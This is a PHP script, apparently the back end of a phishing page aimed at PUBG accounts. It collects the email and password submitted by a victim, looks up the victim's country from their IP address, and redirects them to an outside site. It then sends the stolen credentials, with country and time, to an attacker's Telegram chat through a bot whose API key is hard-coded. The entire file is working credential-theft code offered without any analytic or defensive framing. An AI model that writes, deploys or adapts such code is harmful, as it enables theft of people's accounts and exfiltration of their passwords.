<?php
ob_start();
$API_KEY = '1347757303:AAH-k89wbKT-RpWEwv28dXvwmN9wluzL_6g';
define('API_KEY',$API_KEY);
echo file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;


// pubg //
$admin = "1370244887";
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];

if($email){
$api_key = "40b16946a67b70c3f34e7943e4825235";
$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
$jsondata = json_decode($cty1);
$cty = $jsondata->country_code;
$url1 = "https://www.koc3hy.xyz/";
header("location: $url1");
$name = $message->from->first_name;
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
😃 A new account has been accessed 🙈✅
⇦ $login

👤 ¦ البريد » $email
📟 ¦ كلمة السر  » $password

👁️‍🗨️¦ دولة الحساب » $cty
⏱ ¦ الوقت » $time
📝 ¦ التاريخ » $day/$month/$year
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>